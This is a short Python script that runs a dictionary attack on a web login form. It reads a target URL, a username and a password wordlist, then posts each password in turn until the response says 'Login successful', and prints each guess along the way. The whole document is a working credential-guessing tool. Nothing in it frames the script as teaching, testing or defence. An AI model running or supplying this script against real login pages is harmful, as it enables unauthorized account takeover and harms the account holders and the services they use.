import requests

url = input("Enter target login URL: ")
username = input("Enter username: ")
password_file = input("Enter path to password file: ")

with open(password_file, "r") as file:
    for password in file:
        password = password.strip()
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        if "Login successful" in response.text:
            print(f"[+] Password found: {password}")
            break
        else:
            print(f"[-] Tried: {password}")
